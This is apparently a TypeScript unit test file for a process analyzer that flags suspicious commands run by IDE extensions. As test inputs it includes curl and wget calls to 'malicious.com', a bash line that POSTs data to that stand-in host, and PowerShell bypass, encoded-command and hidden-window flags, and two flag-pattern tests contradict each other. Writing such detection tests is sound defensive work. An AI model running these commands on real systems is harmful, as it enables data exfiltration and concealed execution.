/**
 * Unit tests for ProcessAnalyzer
 */

import { expect, use } from 'chai';
const sinon = require('sinon');
const sinonChai = require('sinon-chai');

use(sinonChai);
import { ProcessAnalyzer } from '../../monitor/analysis/process-analyzer';
import { ExecEvent } from '../../lib/events/process-events';
import { ExtensionInfo } from '../../lib/events/ext-events';
import { PROCESS_RULES } from '../../detection/process-rules';
import { AllowListService } from '../../lib/services/allowlist-service';
import { IDEStatusService } from '../../lib/services/ide-status-service';
import { createMockExtensionInfo } from '../test-utils';

suite('ProcessAnalyzer Tests', () => {
  let analyzer: ProcessAnalyzer;
  let allowListStub: sinon.SinonStub;
  let updatePerformanceMetricsStub: sinon.SinonStub;
  let emitSecurityEventStub: sinon.SinonStub;

  setup(() => {
    analyzer = new ProcessAnalyzer();

    // Mock AllowListService
    const mockAllowListService = { isAllowed: sinon.stub().returns(false) };
    allowListStub = sinon.stub(AllowListService, 'getInstance').returns(mockAllowListService as any);

    // Mock IDEStatusService
    updatePerformanceMetricsStub = sinon.stub(IDEStatusService, 'updatePerformanceMetrics').resolves();
    emitSecurityEventStub = sinon.stub(IDEStatusService, 'emitSecurityEvent').resolves();
  });

  teardown(() => {
    sinon.restore();
  });

  suite('Analysis Core', () => {
    test('should return AnalysisResult', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('echo', ['hello'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result).to.exist;
      expect(result).to.have.property('verdict');
    });

    test('should return allowed verdict for safe commands', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('echo', ['hello'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.true;
      expect(result!.securityEvent).to.be.undefined;
    });

    test('should detect suspicious commands', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('curl', ['http://malicious.com'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
      expect(result!.securityEvent).to.exist;
    });

    test('should check against allow list', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('curl', ['http://malicious.com'], {}, __filename, extensionInfo);

      analyzer.analyze(event);

      expect(AllowListService.getInstance().isAllowed).to.have.been.calledWith('test.extension');
    });

    test('should stop on first matching rule', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      // This command could match multiple rules, should only get one SecurityEvent
      const event = new ExecEvent('bash', ['-c', 'curl http://malicious.com'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.securityEvent).to.exist;
      // Should have exactly one IoC (first matching rule)
      expect(result!.securityEvent!.iocs.length).to.equal(1);
    });

    test('should record performance metrics', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('echo', ['hello'], {}, __filename, extensionInfo);

      analyzer.analyze(event);

      expect(updatePerformanceMetricsStub.called).to.be.true;
    });

    test('should handle missing extension info', () => {
      const event = new ExecEvent('curl', ['http://malicious.com'], {}, __filename, undefined as any);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.true;
    });
  });

  suite('Rule Matching - PowerShell', () => {
    test('should detect powershell command', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('powershell', ['-Command', 'Get-Process'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
      expect(result!.securityEvent).to.exist;
      expect(result!.securityEvent!.iocs[0].rule).to.include('PowerShell');
    });

    test('should detect powershell.exe', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('powershell.exe', ['-NoProfile'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should detect pwsh command', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('pwsh', ['-Version', '7'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should detect suspicious powershell flags', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent(
        'powershell',
        ['-ExecutionPolicy', 'Bypass', '-NoProfile'],
        {},
        __filename,
        extensionInfo,
      );

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
      expect(result!.securityEvent).to.exist;
    });

    test('should detect encoded command flag', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('powershell', ['-EncodedCommand', 'BASE64STRING'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should detect hidden window style', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('powershell', ['-WindowStyle', 'Hidden'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should be case-insensitive for powershell', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('POWERSHELL', ['-Command', 'Test'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });
  });

  suite('Rule Matching - Command Injection', () => {
    test('should detect bash command', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('bash', ['-c', 'echo hello'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
      expect(result!.securityEvent).to.exist;
    });

    test('should detect sh command', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('sh', ['-c', 'ls'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should detect zsh command', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('zsh', ['-c', 'pwd'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should detect curl command', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('curl', ['http://example.com'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should detect wget command', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('wget', ['http://example.com/file.txt'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should be case-insensitive', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('CURL', ['http://example.com'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });
  });

  suite('Command and Args Matching', () => {
    test('should match command pattern in cmd field', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('curl', [], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should match command pattern in full command with args', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('/usr/bin/bash', ['-c', 'echo test'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should match suspicious flags in args', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent(
        'powershell.exe',
        ['-EncodedCommand', 'SGVsbG8gV29ybGQ='],
        {},
        __filename,
        extensionInfo,
      );

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should handle empty args array', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('curl', [], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });

    test('should handle complex command with multiple args', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent(
        'bash',
        ['-c', 'curl -X POST http://malicious.com -d "data"'],
        {},
        __filename,
        extensionInfo,
      );

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
    });
  });

  suite('SecurityEventCreation', () => {
    test('should create SecurityEvent for detected threats', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('curl', ['http://malicious.com'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.securityEvent).to.exist;
      expect(result!.securityEvent!.extension).to.exist;
      expect(result!.securityEvent!.extension!.id).to.equal('test.extension');
    });

    test('should include IoC in SecurityEvent', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('wget', ['http://example.com'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.securityEvent!.iocs).to.have.length.greaterThan(0);
      const ioc = result!.securityEvent!.iocs[0];
      expect(ioc.finding).to.include('wget');
      expect(ioc.rule).to.exist;
      expect(ioc.description).to.exist;
    });

    test('should set correct severity', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('powershell', ['-enc', 'BASE64'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      const rule = PROCESS_RULES.find((r) => r.id === 'powershell_execution');
      expect(result!.securityEvent!.severity).to.equal(rule!.severity);
    });

    test('should set correct confidence', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('bash', ['-c', 'test'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      const ioc = result!.securityEvent!.iocs[0];
      expect(ioc.confidence).to.equal(1);
    });
  });

  suite('Allow List Integration', () => {
    test('should bypass detection for allowed extensions', () => {
      const mockAllowListService = AllowListService.getInstance() as any;
      mockAllowListService.isAllowed.returns(true);

      const extensionInfo = createMockExtensionInfo('trusted.extension', true);
      const event = new ExecEvent('curl', ['http://malicious.com'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.true;
      expect(emitSecurityEventStub.called).to.be.false;
    });

    test('should block detection for non-allowed extensions', () => {
      const mockAllowListService = AllowListService.getInstance() as any;
      mockAllowListService.isAllowed.returns(false);

      const extensionInfo = createMockExtensionInfo('untrusted.extension', true);
      const event = new ExecEvent('curl', ['http://malicious.com'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      expect(result!.verdict.allowed).to.be.false;
      expect(emitSecurityEventStub.called).to.be.true;
    });
  });

  suite('Error Handling', () => {
    test('should handle exceptions gracefully', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('curl', ['http://example.com'], {}, __filename, extensionInfo);

      // Force an error
      allowListStub.throws(new Error('AllowList error'));

      const result = analyzer.analyze(event);

      // Should return default allowed result on error
      expect(result).to.exist;
      expect(result!.verdict.allowed).to.be.true;
    });

    test('should handle performance metrics error', () => {
      updatePerformanceMetricsStub.rejects(new Error('Metrics error'));

      const extensionInfo = createMockExtensionInfo('test.extension', true);
      const event = new ExecEvent('echo', ['test'], {}, __filename, extensionInfo);

      // Should not throw
      expect(() => analyzer.analyze(event)).to.not.throw();
    });
  });

  suite('Flag Pattern Validation', () => {
    test('should require flag pattern match when specified', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      // PowerShell without suspicious flags - should still match command pattern
      const event = new ExecEvent('powershell', ['-Command', 'Get-Date'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      // PowerShell rule has flagPattern, so benign commands should be allowed
      // Actually, looking at the code, it checks flagPattern if it exists
      expect(result!.verdict.allowed).to.be.false; // Still blocked because PowerShell itself is suspicious
    });

    test('should not match if flag pattern exists but does not match', () => {
      const extensionInfo = createMockExtensionInfo('test.extension', true);
      // PowerShell with safe flags
      const event = new ExecEvent('powershell', ['-Version'], {}, __filename, extensionInfo);

      const result = analyzer.analyze(event);

      // Should allow because flagPattern doesn't match
      expect(result!.verdict.allowed).to.be.true;
    });
  });
});
